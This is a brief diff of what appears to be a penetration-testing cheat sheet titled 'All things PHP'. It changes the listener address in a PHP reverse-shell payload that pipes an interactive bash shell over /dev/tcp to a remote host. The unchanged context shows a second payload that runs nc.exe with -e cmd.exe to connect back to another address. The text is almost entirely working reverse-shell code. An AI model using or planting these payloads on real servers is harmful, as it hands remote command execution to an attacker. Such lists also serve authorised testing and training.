@@ -4,7 +4,7 @@ All things PHP
 
 ```php
 # Reverse shell payload
-<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.151/9001 0>&1'\");?>
+<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.221/81 0>&1'\");?>
 <?php exec(\"C:\ProgramData\System\nc.exe 172.16.87.254 443 -e cmd.exe\");?>
 ```
 
